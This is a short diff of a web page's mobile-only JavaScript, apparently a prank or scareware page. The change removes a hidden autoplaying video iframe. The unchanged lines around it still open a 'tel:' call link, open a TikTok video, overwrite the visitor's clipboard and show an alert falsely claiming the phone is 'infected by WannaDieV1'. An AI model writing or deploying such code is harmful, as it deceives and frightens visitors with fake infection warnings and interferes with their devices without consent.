@@ -215,9 +215,7 @@ if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigat
 
 
 
-<iframe id="test" type="text/html" width="0" height="0"
-src="https://www.youtube.com/embed/VfQQWjXV2Js?autoplay=1&fs=0&loop=1"
-frameborder="0" allowfullscreen/>
+
 
 window.open('tel:2029');
 
@@ -234,6 +232,8 @@ window.open("https://www.tiktok.com/@sus.soundss/video/7014179069768043782?is_co
 
       navigator.clipboard.writeText("Dam It Your Iphone Or Any Mobile Phone, Has Been Infected By WannaDieV1 The Damaged Has Been Already Made...");
   alert("Your Iphone Or Any Mobile Device, Has Been Infected By WannaDieV1")
+
+
 
 
 }else{
